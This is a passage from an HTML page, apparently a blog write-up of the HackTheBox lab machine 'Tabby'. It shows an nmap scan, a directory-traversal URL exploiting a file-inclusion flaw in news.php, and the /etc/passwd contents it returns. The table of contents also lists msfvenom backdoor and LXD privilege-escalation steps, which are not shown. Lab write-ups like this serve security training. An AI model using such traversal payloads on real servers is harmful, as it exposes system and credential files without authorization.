@@ -1,0 +1,1178 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.26.2 by Michael Rose
+  Copyright 2013-2024 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+
+<html lang="en-US" class="no-js">
+  <head>
+    <meta charset="utf-8">
+<!-- begin _includes/seo.html --><title>HackTheBox Tabby - Dcodezero</title>
+<meta name="description" content="Tabby is a hackthebox active machine. You need to have the root hash to unlock the walkthrough!">
+
+
+  <meta name="author" content="DcodeZer0">
+  
+  <meta property="article:author" content="DcodeZer0">
+  
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Dcodezero">
+<meta property="og:title" content="HackTheBox Tabby">
+<meta property="og:url" content="http://localhost:4000/hackthebox/Tabby/">
+
+
+  <meta property="og:description" content="Tabby is a hackthebox active machine. You need to have the root hash to unlock the walkthrough!">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/img/sample/tabby/tabby.png">
+
+
+
+
+
+  <meta property="article:published_time" content="2020-07-07T00:00:00+05:30">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/hackthebox/Tabby/">
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Dcodezero Feed">
+
+
+<!-- Add Mermaid with Debug -->
+<script src="https://cdn.jsdelivr.net/npm/mermaid@8.14.0/dist/mermaid.min.js"></script>
+<script>
+document.addEventListener("DOMContentLoaded", function() {
+    mermaid.initialize({
+        startOnLoad: true,
+        securityLevel: 'loose',
+        logLevel: 'debug',
+        mindmap: {
+            padding: 20,
+            nodeSpacing: 60,
+            rankSpacing: 80
+        }
+    });
+
+    // Add error handling
+    mermaid.parseError = function(err, hash) {
+        console.error('Mermaid error:', err);
+        // Add visible error message
+        document.querySelectorAll('.mermaid').forEach(function(elem) {
+            elem.innerHTML += '<div style="color: red; background: #ffebee; padding: 10px; margin-top: 10px; border: 1px solid #ffcdd2;">Diagram Error: ' + err + '</div>';
+        });
+    };
+});
+</script><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<script>
+document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+ window.enable_copy_code_button = true;
+</script>
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@latest/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@latest/css/all.min.css"></noscript>
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single" dir="ltr">
+    <nav class="skip-links">
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/brew.webp" alt="Dcodezero"></a>
+        
+        <a class="site-title" href="/">
+          Dcodezero
+          <span class="site-subtitle">Hack>>Sleep>>Repeat</span>
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a
+                href="/about/"
+                
+                
+              >About</a>
+            </li><li class="masthead__menu-item">
+              <a
+                href="/categories/"
+                
+                
+              >Categories</a>
+            </li><li class="masthead__menu-item">
+              <a
+                href="/tags"
+                
+                
+              >Tags</a>
+            </li><li class="masthead__menu-item">
+              <a
+                href="/it-posts/"
+                
+                
+              >I.T</a>
+            </li><li class="masthead__menu-item">
+              <a
+                href="/tools/"
+                
+                
+              >Tools</a>
+            </li><li class="masthead__menu-item">
+              <a
+                href="/helpedyou/"
+                
+                
+              >Think I Helped You?</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Toggle search</span>
+          <i class="fas fa-search"></i>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+  
+
+
+
+
+
+
+
+<div class="page__hero--overlay"
+  style="background-color: #000; background-image: linear-gradient(rgba(0, 0, 0, 0.75), rgba(0, 0, 0, 0.75)), url('/assets/img/sample/tabby/tabby.png');"
+>
+  
+    <div class="wrapper">
+      <h1 id="page-title" class="page__title" itemprop="headline">
+        
+          HackTheBox Tabby
+
+        
+      </h1>
+      
+        <p class="page__lead">Tabby is a hackthebox active machine. You need to have the root hash to unlock the walkthrough!
+</p>
+      
+      
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2020-07-07T00:00:00+05:30">July 7, 2020</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          7 minute read
+        
+      </span>
+    
+  </p>
+
+
+      
+    </div>
+  
+  
+</div>
+
+
+
+
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="/" itemprop="item"><span itemprop="name">Home</span></a>
+
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="/categories/#hackthebox" itemprop="item"><span itemprop="name">Hackthebox</span></a>
+          <meta itemprop="position" content="2" />
+        </li>
+        <span class="sep">/</span>
+      
+    
+      
+      
+        <li class="current">HackTheBox Tabby</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person" class="h-card">
+
+  
+    <div class="author__avatar">
+      <a href="/">
+        <img src="/assets/images/brew.webp" alt="DcodeZer0" itemprop="image" class="u-photo">
+      </a>
+    </div>
+  
+
+  <div class="author__content">
+    <h3 class="author__name p-name" itemprop="name">
+      <a class="u-url" rel="me" href="/" itemprop="url">DcodeZer0</a>
+    </h3>
+    
+      <div class="author__bio p-note" itemprop="description">
+        <p>┌──[root@dcodezero]
+└──╼ # Hacker | RedTeam | PenTester | CTFPlayer | HackTheBox</p>
+
+      </div>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name" class="p-locality">Somewhere</span>
+        </li>
+      
+
+      
+        
+          
+            <li><a href="https://twitter.com/Dcodezer0" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
+          
+        
+          
+            <li><a href="https://github.com/DcodeZero" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
+          
+        
+          
+            <li><a href="https://app.hackthebox.com/profile/291968" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fa-solid fa-cube" aria-hidden="true"></i><span class="label">Hackthebox</span></a></li>
+          
+        
+      
+
+      
+
+      
+        <li>
+          <a href="mailto:dcodezero@proton.me" rel="me" class="u-email">
+            <meta itemprop="email" content="dcodezero@proton.me" />
+            <i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">Email</span>
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer me">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="HackTheBox Tabby">
+    <meta itemprop="description" content="Tabby is a hackthebox active machine. You need to have the root hash to unlock the walkthrough!">
+    <meta itemprop="datePublished" content="2020-07-07T00:00:00+05:30">
+    
+
+    <div class="page__inner-wrap">
+      
+
+      <section class="page__content" itemprop="text">
+        
+          <aside class="sidebar__right ">
+            <nav class="toc">
+              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> On this page</h4></header>
+              <ul class="toc__menu"><li><a href="#lets-get-started">Let’s get started</a><ul><li><a href="#as-always-hacking-starts-with-nmap-scan">As always hacking starts with NMAP scan.</a></li></ul></li><li><a href="#lfi">LFI</a></li><li><a href="#getting-foothold">Getting Foothold</a></li><li><a href="#time-for-creating-the-backdoor">Time for creating the backdoor.</a><ul><li><a href="#there-are-two-ways-of-doing-this-this-is-my-of-doing-it">There are two ways of doing this. This is my of doing it.</a></li></ul></li><li><a href="#crafting-the-payload-with-msfvenom">Crafting the payload with msfvenom.</a></li><li><a href="#time-to-upload-the-payload-now">Time to upload the payload now.</a></li><li><a href="#privilege-escalation-to-user-ash">Privilege escalation to User ASH</a></li><li><a href="#cracking-the-password-with-john">Cracking the password with JOHN.</a><ul><li><a href="#john-backup-hash--wusrsharewordlistsrockyoutxt">john backup-hash -w=/usr/share/wordlists/rockyou.txt</a></li></ul></li><li><a href="#unzipping-the-file-with-the-password-found">Unzipping the file with the password found.</a><ul><li><a href="#bad-luck-that-was-a-rabbit-hole">Bad luck! That was a Rabbit hole..</a></li></ul></li></ul></li><li><a href="#getting-usertxt">Getting User.txt</a></li><li><a href="#privilege-escalation-to-root">Privilege Escalation to Root.</a><ul><li><a href="#we-see-that-ash-is-part-of-lxd-group-so-according-to-article-httpswwwhackingarticlesinlxd-privilege-escalation-i-just-followed-the-steps-and-got-root-">We see that ash is part of lxd group. So according to article https://www.hackingarticles.in/lxd-privilege-escalation/ I just followed the steps and got root .</a></li><li><a href="#as-there-are-many-ways-on-priv-esc-using-lxd-i-took-help-of-hackingarticles-for-it">As there are many ways on priv esc using LXD I took help of hackingarticles for it.</a></li><li><a href="#you-will-get-a-targz-file-set-up-http-server-and-copy-it-to-the-remote-machine">You will get a tar.gz file. Set up http server and copy it to the remote machine.</a></li><li><a href="#on-another-hand-we-will-download-the-alpine-image-inside-tmp-directory-on-the-host-machine">On another hand we will download the alpine-image inside /tmp directory on the host machine.</a></li><li><a href="#after-the-image-is-built-it-can-be-added-as-an-image-to-lxd-as-follows">After the image is built it can be added as an image to LXD as follows:</a></li></ul></li></ul></li></ul>
+            </nav>
+          </aside>
+        
+        <h2 id="lets-get-started">Let’s get started</h2>
+
+<table>
+  <thead>
+    <tr>
+      <th>Column</th>
+      <th> </th>
+      <th> </th>
+      <th> </th>
+      <th>Detail</th>
+      <th> </th>
+      <th> </th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>OS:</td>
+      <td> </td>
+      <td> </td>
+      <td> </td>
+      <td> </td>
+      <td> </td>
+      <td>Linux</td>
+    </tr>
+    <tr>
+      <td>Difficulty:</td>
+      <td> </td>
+      <td> </td>
+      <td> </td>
+      <td> </td>
+      <td> </td>
+      <td>Easy</td>
+    </tr>
+    <tr>
+      <td>Points:</td>
+      <td> </td>
+      <td> </td>
+      <td> </td>
+      <td> </td>
+      <td> </td>
+      <td>20</td>
+    </tr>
+    <tr>
+      <td>Release:</td>
+      <td> </td>
+      <td> </td>
+      <td> </td>
+      <td> </td>
+      <td> </td>
+      <td>20 Jun 2020</td>
+    </tr>
+    <tr>
+      <td>IP:</td>
+      <td> </td>
+      <td> </td>
+      <td> </td>
+      <td> </td>
+      <td> </td>
+      <td>10.10.10.194</td>
+    </tr>
+  </tbody>
+</table>
+
+<h3 id="as-always-hacking-starts-with-nmap-scan">As always hacking starts with NMAP scan.</h3>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span>
+Discovered open port 80/tcp on 10.10.10.194
+Discovered open port 8080/tcp on 10.10.10.194
+Discovered open port 22/tcp on 10.10.10.194
+Completed SYN Stealth Scan at 07:52, 2.07s elapsed <span class="o">(</span>1000 total ports<span class="o">)</span>
+Not shown: 997 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+80/tcp   open  http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-favicon: Unknown favicon MD5: 338ABBB5EA8D80B9869555ECA253D49D
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Mega Hosting
+8080/tcp open  http    Apache Tomcat
+| http-methods: 
+|_  Supported Methods: OPTIONS GET HEAD POST
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-title: Apache Tomcat
+No exact OS matches <span class="k">for </span>host <span class="o">(</span>If you know what OS is running on it, see https://nmap.org/submit/ <span class="o">)</span><span class="nb">.</span>
+TCP/IP fingerprint:
+OS:SCAN<span class="o">(</span><span class="nv">V</span><span class="o">=</span>7.80%E<span class="o">=</span>4%D<span class="o">=</span>6/21%OT<span class="o">=</span>22%CT<span class="o">=</span>1%CU<span class="o">=</span>41896%PV<span class="o">=</span>Y%DS<span class="o">=</span>2%DC<span class="o">=</span>T%G<span class="o">=</span>Y%TM<span class="o">=</span>5EEF000
+OS:0%P<span class="o">=</span>x86_64-pc-linux-gnu<span class="o">)</span>SEQ<span class="o">(</span><span class="nv">SP</span><span class="o">=</span>105%GCD<span class="o">=</span>1%ISR<span class="o">=</span>10C%TI<span class="o">=</span>Z%CI<span class="o">=</span>Z%II<span class="o">=</span>I%TS<span class="o">=</span>A<span class="o">)</span>OPS
+OS:<span class="o">(</span><span class="nv">O1</span><span class="o">=</span>M54DST11NW7%O2<span class="o">=</span>M54DST11NW7%O3<span class="o">=</span>M54DNNT11NW7%O4<span class="o">=</span>M54DST11NW7%O5<span class="o">=</span>M54DST1
+OS:1NW7%O6<span class="o">=</span>M54DST11<span class="o">)</span>WIN<span class="o">(</span><span class="nv">W1</span><span class="o">=</span>FE88%W2<span class="o">=</span>FE88%W3<span class="o">=</span>FE88%W4<span class="o">=</span>FE88%W5<span class="o">=</span>FE88%W6<span class="o">=</span>FE88<span class="o">)</span>ECN
+OS:<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>FAF0%O<span class="o">=</span>M54DNNSNW7%CC<span class="o">=</span>Y%Q<span class="o">=)</span>T1<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%S<span class="o">=</span>O%A<span class="o">=</span>S+%F<span class="o">=</span>A
+OS:S%RD<span class="o">=</span>0%Q<span class="o">=)</span>T2<span class="o">(</span><span class="nv">R</span><span class="o">=</span>N<span class="o">)</span>T3<span class="o">(</span><span class="nv">R</span><span class="o">=</span>N<span class="o">)</span>T4<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>0%S<span class="o">=</span>A%A<span class="o">=</span>Z%F<span class="o">=</span>R%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>T5<span class="o">(</span>R
+OS:<span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>0%S<span class="o">=</span>Z%A<span class="o">=</span>S+%F<span class="o">=</span>AR%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>T6<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>0%S<span class="o">=</span>A%A<span class="o">=</span>Z%F
+OS:<span class="o">=</span>R%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>T7<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>0%S<span class="o">=</span>Z%A<span class="o">=</span>S+%F<span class="o">=</span>AR%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>U1<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>N%
+OS:T<span class="o">=</span>40%IPL<span class="o">=</span>164%UN<span class="o">=</span>0%RIPL<span class="o">=</span>G%RID<span class="o">=</span>G%RIPCK<span class="o">=</span>G%RUCK<span class="o">=</span>G%RUD<span class="o">=</span>G<span class="o">)</span>IE<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DFI<span class="o">=</span>N%T<span class="o">=</span>40%CD
+OS:<span class="o">=</span>S<span class="o">)</span>
+
+Uptime guess: 12.366 days <span class="o">(</span>since Tue Jun  9 00:49:25 2020<span class="o">)</span>
+Network Distance: 2 hops
+TCP Sequence Prediction: <span class="nv">Difficulty</span><span class="o">=</span>261 <span class="o">(</span>Good luck!<span class="o">)</span>
+IP ID Sequence Generation: All zeros
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE <span class="o">(</span>using port 995/tcp<span class="o">)</span>
+HOP RTT       ADDRESS
+1   128.32 ms 10.10.14.1
+2   128.88 ms 10.10.10.194
+
+NSE: Script Post-scanning.
+Initiating NSE at 09:36
+Completed NSE at 09:36, 0.00s elapsed
+Initiating NSE at 09:36
+Completed NSE at 09:36, 0.00s elapsed
+Initiating NSE at 09:36
+Completed NSE at 09:36, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>31.88 seconds
+           Raw packets sent: 1289 <span class="o">(</span>61.746KB<span class="o">)</span> | Rcvd: 1410 <span class="o">(</span>433.356KB<span class="o">)</span>
+</code></pre></div></div>
+<p>On visiting the <code class="language-plaintext highlighter-rouge">port 80</code> there is a website <code class="language-plaintext highlighter-rouge">Megahosting.HTB</code> with some content on it.</p>
+
+<p><img src="/assets/img/sample/tabby/tabby1.png" alt="" /></p>
+
+<p>So I desided to add <code class="language-plaintext highlighter-rouge">megahosting.htb</code> to  <code class="language-plaintext highlighter-rouge">/etc/hosts</code> in my kali.</p>
+
+<blockquote>
+  <p><code class="language-plaintext highlighter-rouge">10.10.10.194 tabby.htb megahosting.htb</code></p>
+</blockquote>
+
+<p>After all the things are done, then I came to see that a <code class="language-plaintext highlighter-rouge">URL</code> ` http://megahosting.htb/news.php?file=statement<code class="language-plaintext highlighter-rouge"> looks like </code>LFI` is going to work out.</p>
+
+<p><img src="/assets/img/sample/tabby/tabby2.png" alt="" /></p>
+
+<h2 id="lfi">LFI</h2>
+
+<p>A file inclusion vulnerability is a type of web vulnerability that is most commonly found to affect web applications that rely on a scripting run time.</p>
+
+<p>So I was able to get the /etc/passwd by doing so <code class="language-plaintext highlighter-rouge">http://megahosting.htb/news.php?file=../.../etc/passwd</code>. we get directory traversal.</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">root</span><span class="ss">:x</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="ss">:root:/</span><span class="n">root</span><span class="ss">:/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span>
+<span class="n">daemon</span><span class="ss">:x</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span><span class="mi">1</span><span class="ss">:daemon:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="ss">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">bin</span><span class="ss">:x</span><span class="p">:</span><span class="mi">2</span><span class="p">:</span><span class="mi">2</span><span class="ss">:bin:/</span><span class="n">bin</span><span class="ss">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">sys</span><span class="ss">:x</span><span class="p">:</span><span class="mi">3</span><span class="p">:</span><span class="mi">3</span><span class="ss">:sys:/</span><span class="n">dev</span><span class="ss">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">sync</span><span class="ss">:x</span><span class="p">:</span><span class="mi">4</span><span class="p">:</span><span class="mi">65534</span><span class="ss">:sync:/</span><span class="n">bin</span><span class="ss">:/</span><span class="n">bin</span><span class="o">/</span><span class="n">sync</span>
+<span class="n">games</span><span class="ss">:x</span><span class="p">:</span><span class="mi">5</span><span class="p">:</span><span class="mi">60</span><span class="ss">:games:/</span><span class="n">usr</span><span class="o">/</span><span class="n">games</span><span class="ss">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">man</span><span class="ss">:x</span><span class="p">:</span><span class="mi">6</span><span class="p">:</span><span class="mi">12</span><span class="ss">:man:/</span><span class="n">var</span><span class="o">/</span><span class="n">cache</span><span class="o">/</span><span class="n">man</span><span class="ss">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">lp</span><span class="ss">:x</span><span class="p">:</span><span class="mi">7</span><span class="p">:</span><span class="mi">7</span><span class="ss">:lp:/</span><span class="n">var</span><span class="o">/</span><span class="n">spool</span><span class="o">/</span><span class="n">lpd</span><span class="ss">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">mail</span><span class="ss">:x</span><span class="p">:</span><span class="mi">8</span><span class="p">:</span><span class="mi">8</span><span class="ss">:mail:/</span><span class="n">var</span><span class="o">/</span><span class="n">mail</span><span class="ss">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">news</span><span class="ss">:x</span><span class="p">:</span><span class="mi">9</span><span class="p">:</span><span class="mi">9</span><span class="ss">:news:/</span><span class="n">var</span><span class="o">/</span><span class="n">spool</span><span class="o">/</span><span class="n">news</span><span class="ss">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">uucp</span><span class="ss">:x</span><span class="p">:</span><span class="mi">10</span><span class="p">:</span><span class="mi">10</span><span class="ss">:uucp:/</span><span class="n">var</span><span class="o">/</span><span class="n">spool</span><span class="o">/</span><span class="n">uucp</span><span class="ss">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">proxy</span><span class="ss">:x</span><span class="p">:</span><span class="mi">13</span><span class="p">:</span><span class="mi">13</span><span class="ss">:proxy:/</span><span class="n">bin</span><span class="ss">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="ss">:x</span><span class="p">:</span><span class="mi">33</span><span class="p">:</span><span class="mi">33</span><span class="ss">:www</span><span class="o">-</span><span class="n">data</span><span class="ss">:/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="ss">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">backup</span><span class="ss">:x</span><span class="p">:</span><span class="mi">34</span><span class="p">:</span><span class="mi">34</span><span class="ss">:backup:/</span><span class="n">var</span><span class="o">/</span><span class="n">backups</span><span class="ss">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">list</span><span class="ss">:x</span><span class="p">:</span><span class="mi">38</span><span class="p">:</span><span class="mi">38</span><span class="ss">:Mailing</span> <span class="no">List</span> <span class="no">Manager</span><span class="ss">:/</span><span class="n">var</span><span class="o">/</span><span class="n">list</span><span class="ss">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">irc</span><span class="ss">:x</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">39</span><span class="ss">:ircd:/</span><span class="n">var</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">ircd</span><span class="ss">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">gnats</span><span class="ss">:x</span><span class="p">:</span><span class="mi">41</span><span class="p">:</span><span class="mi">41</span><span class="ss">:Gnats</span> <span class="no">Bug</span><span class="o">-</span><span class="no">Reporting</span> <span class="no">System</span> <span class="p">(</span><span class="n">admin</span><span class="p">)</span><span class="ss">:/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">gnats</span><span class="ss">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">nobody</span><span class="ss">:x</span><span class="p">:</span><span class="mi">65534</span><span class="p">:</span><span class="mi">65534</span><span class="ss">:nobody:/</span><span class="n">nonexistent</span><span class="ss">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">systemd</span><span class="o">-</span><span class="n">network</span><span class="ss">:x</span><span class="p">:</span><span class="mi">100</span><span class="p">:</span><span class="mi">102</span><span class="ss">:systemd</span> <span class="no">Network</span> <span class="no">Management</span><span class="p">,,,</span><span class="ss">:/</span><span class="n">run</span><span class="o">/</span><span class="n">systemd</span><span class="ss">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">systemd</span><span class="o">-</span><span class="n">resolve</span><span class="ss">:x</span><span class="p">:</span><span class="mi">101</span><span class="p">:</span><span class="mi">103</span><span class="ss">:systemd</span> <span class="no">Resolver</span><span class="p">,,,</span><span class="ss">:/</span><span class="n">run</span><span class="o">/</span><span class="n">systemd</span><span class="ss">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">systemd</span><span class="o">-</span><span class="n">timesync</span><span class="ss">:x</span><span class="p">:</span><span class="mi">102</span><span class="p">:</span><span class="mi">104</span><span class="ss">:systemd</span> <span class="no">Time</span> <span class="no">Synchronization</span><span class="p">,,,</span><span class="ss">:/</span><span class="n">run</span><span class="o">/</span><span class="n">systemd</span><span class="ss">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">messagebus</span><span class="ss">:x</span><span class="p">:</span><span class="mi">103</span><span class="p">:</span><span class="mi">106</span><span class="o">::/</span><span class="n">nonexistent</span><span class="ss">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">syslog</span><span class="ss">:x</span><span class="p">:</span><span class="mi">104</span><span class="p">:</span><span class="mi">110</span><span class="o">::/</span><span class="n">home</span><span class="o">/</span><span class="n">syslog</span><span class="ss">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">_apt</span><span class="ss">:x</span><span class="p">:</span><span class="mi">105</span><span class="p">:</span><span class="mi">65534</span><span class="o">::/</span><span class="n">nonexistent</span><span class="ss">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">tss</span><span class="ss">:x</span><span class="p">:</span><span class="mi">106</span><span class="p">:</span><span class="mi">111</span><span class="ss">:TPM</span> <span class="n">software</span> <span class="n">stack</span><span class="p">,,,</span><span class="ss">:/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">tpm</span><span class="ss">:/</span><span class="n">bin</span><span class="o">/</span><span class="kp">false</span>
+<span class="n">uuidd</span><span class="ss">:x</span><span class="p">:</span><span class="mi">107</span><span class="p">:</span><span class="mi">112</span><span class="o">::/</span><span class="n">run</span><span class="o">/</span><span class="n">uuidd</span><span class="ss">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
